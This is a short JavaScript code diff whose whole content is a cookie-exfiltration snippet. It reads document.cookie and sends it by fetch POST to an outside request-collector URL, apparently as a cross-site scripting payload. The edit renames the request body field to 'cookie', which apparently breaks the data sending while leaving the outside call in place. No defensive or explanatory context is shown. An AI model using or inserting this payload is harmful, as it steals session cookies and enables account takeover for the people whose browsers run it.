@@ -9,13 +9,13 @@
             const headers = new Headers();
             headers.append("Content-Type", "application/json");
     
-            const body = JSON.stringify({cookie: document.cookie});
+            const cookie = JSON.stringify({cookie: document.cookie});
     
             const options = {
                 method: "POST",
                 headers,
                 mode: "cors",
-                body: body,
+                cookie: cookie,
             };
     
             fetch("https://requestbin.kanbanbox.com/1mazijq1", options);
